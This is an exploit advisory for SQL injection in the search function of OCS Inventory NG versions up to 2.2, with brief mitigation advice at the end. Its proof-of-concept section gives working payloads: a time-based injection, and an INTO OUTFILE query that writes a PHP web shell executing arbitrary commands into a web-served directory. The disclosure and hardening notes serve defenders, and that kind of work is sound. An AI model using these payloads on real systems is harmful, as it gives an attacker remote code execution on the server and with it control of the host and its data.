# Exploit Title: OCS Inventory NG <= 2.2 - Search with various criteria SQL Injection and Code execution
# Date: 17-02-2016
# Exploit Author: Ephreet
# Software Link: http://www.ocsinventory-ng.org/en/download/
# Version: <=2.2
# Category: webapps
# Tested on: Debian 3.2.73-2+deb7u2 (MySQL 5.5.47-0+deb7u1, Apache/2.2.22), CentOS 6/7


1. Description

Custom search allows for SQL Injection, while default configuration allows for file write as MySQL user.
Search field fails to escape MySQL special characters, allowing file creation and code execution.

If permissions are not carefully set, one could write to web/crontab folders.

Infrustructure note: this was tested on a single machine, but still applies to multiple servers environments, affecting the DB host.


2. Proof of Concept

At least a low priv user must be logged and access the search function on http://<server>/ocsreports/index.php?function=visu_search

- Time-based SQL Injection
Choose a parameter, use EXACTLY operator:
')) union select sleep(5); #

- Code execution
Bypass input escape and write to filesystem (webshell PoC):
')) union select CONCAT(char(60),char(63),'php echo exec($_GET[',char(39),'cmd',char(39),']);',char(63),char(62)) into outfile '/usr/share/ocsinventory-reports/ocsreports/plugins/main_sections/conf/shell.php'; #


3. Solution

Run MySQL/Apache services as restricted user.
Restrict file write permissions to ocs DB user.
Watch out for weak permissions on /usr/share/ocsinventory-reports/ocsreports/plugins/main_sections/conf/ (it is often set to full write by inexperienced admins).
